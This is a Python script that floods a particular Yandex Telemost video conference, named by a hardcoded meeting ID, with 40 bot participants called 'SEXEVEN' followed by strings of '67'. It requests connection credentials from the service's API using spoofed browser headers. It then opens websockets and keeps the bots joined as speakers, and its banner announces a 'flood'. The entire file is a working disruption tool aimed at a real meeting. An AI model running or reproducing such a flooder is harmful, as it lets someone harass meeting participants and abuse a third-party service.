#!/usr/bin/env python3

import asyncio
import json
import uuid
import requests
from urllib.parse import quote
import websockets

CONFERENCE_ID = "33734896687006"
CONFERENCE_URL = f"https://telemost.yandex.ru/j/{CONFERENCE_ID}"
API_BASE = "https://cloud-api.yandex.ru/telemost_front/v2/telemost"

def generate_uuid():
    return str(uuid.uuid4())

def get_connection_info(display_name):
    url = f"{API_BASE}/conferences/{quote(CONFERENCE_URL, safe='')}/connection"
    params = {
        "next_gen_media_platform_allowed": "true",
        "display_name": display_name,
        "waiting_room_supported": "true"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0",
        "Accept": "*/*",
        "content-type": "application/json",
        "Client-Instance-Id": generate_uuid(),
        "X-Telemost-Client-Version": "187.1.0",
        "idempotency-key": generate_uuid(),
        "Origin": "https://telemost.yandex.ru",
        "Referer": "https://telemost.yandex.ru/"
    }
    
    response = requests.get(url, params=params, headers=headers)
    response.raise_for_status()
    return response.json()

async def connect_peer(name, peer_num):
    try:
        conn_info = get_connection_info(name)
        room_id = conn_info["room_id"]
        peer_id = conn_info["peer_id"]
        credentials = conn_info["credentials"]
        ws_url = conn_info["client_configuration"]["media_server_url"]
        
        ws = await websockets.connect(ws_url)
        
        hello_msg = {
            "uid": generate_uuid(),
            "hello": {
                "participantMeta": {
                    "name": name,
                    "role": "SPEAKER",
                    "description": "",
                    "sendAudio": False,
                    "sendVideo": False
                },
                "participantAttributes": {
                    "name": name,
                    "role": "SPEAKER",
                    "description": ""
                },
                "sendAudio": False,
                "sendVideo": False,
                "sendSharing": False,
                "participantId": peer_id,
                "roomId": room_id,
                "serviceName": "telemost",
                "credentials": credentials,
                "capabilitiesOffer": {
                    "offerAnswerMode": ["SEPARATE"],
                    "initialSubscriberOffer": ["ON_HELLO"],
                    "slotsMode": ["FROM_CONTROLLER"],
                    "simulcastMode": ["DISABLED"],
                    "selfVadStatus": ["FROM_SERVER"]
                },
                "sdkInfo": {
                    "implementation": "python",
                    "version": "1.0.0",
                    "userAgent": "SEXEVEN-Bot"
                },
                "sdkInitializationId": generate_uuid(),
                "disablePublisher": False,
                "disableSubscriber": False
            }
        }
        
        await ws.send(json.dumps(hello_msg))
        
        async def keep_alive():
            while True:
                try:
                    data = json.loads(await ws.recv())
                    if "serverHello" in data:
                        await ws.send(json.dumps({"uid": data["uid"], "ack": {"status": {"code": "OK"}}}))
                except:
                    break
        
        print(f"[:P] {name} connected (#{peer_num})")
        
        await keep_alive()
        
    except Exception as e:
        print(f"[✗] {name} failed: {e}")

async def main():
    print(r"""

    SEXEVEN FLOOD стойте пацаны это не флуд это просто мемчик                          
              Connecting 40 peers to conference                   

""")
    
    print(f"Target: {CONFERENCE_URL}\n")
    print("Starting flood...\n")
    
    tasks = []
    
    for i in range(1, 41):
        suffix = "67" * i
        name = f"SEXEVEN {suffix}"
        
        task = asyncio.create_task(connect_peer(name, i))
        tasks.append(task)
        
        await asyncio.sleep(0.5)
    
    print(f"\n[*] All 40 peers launched!")
    print(f"[*] Keeping connections alive (Ctrl+C to stop)...\n")
    
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        print("\n[*] Stopping flood...")
        for task in tasks:
            task.cancel()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nFlood stopped.")
